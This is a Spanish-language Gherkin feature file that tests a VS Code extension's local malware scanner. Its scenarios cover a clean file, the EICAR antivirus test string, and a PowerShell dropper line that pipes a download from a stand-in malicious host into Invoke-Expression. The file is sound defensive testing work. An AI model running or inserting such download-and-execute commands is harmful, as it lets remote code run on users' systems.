Feature: Escáner Local RustGuard

  Como desarrollador que utiliza VS Code
  Quiero que la extensión inspeccione mis archivos de código
  Para asegurarme de que no estoy introduciendo malware o código ofuscado al repositorio

  Scenario: Detectar un archivo inofensivo
    Given que tengo un archivo llamado "limpio.txt" con el contenido "Texto normal y seguro"
    When ejecuto el escáner de patrones de contenido en el archivo
    Then el resultado debe ser "Seguro"

  Scenario: Detectar una firma de virus (EICAR)
    Given que tengo un archivo llamado "virus.txt" con el contenido "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    When ejecuto el escáner de firmas criptográficas en el archivo
    Then el sistema debe alertar sobre "EICAR-Test-File"

  Scenario: Detectar droppers remotos (Descarga maliciosa)
    Given que tengo un script llamado "script.ps1" con un comando "Invoke-WebRequest http://malware.com | Invoke-Expression"
    When ejecuto el escáner de patrones de contenido en el archivo
    Then el sistema debe alertar sobre "Trojan.Downloader.Generic"
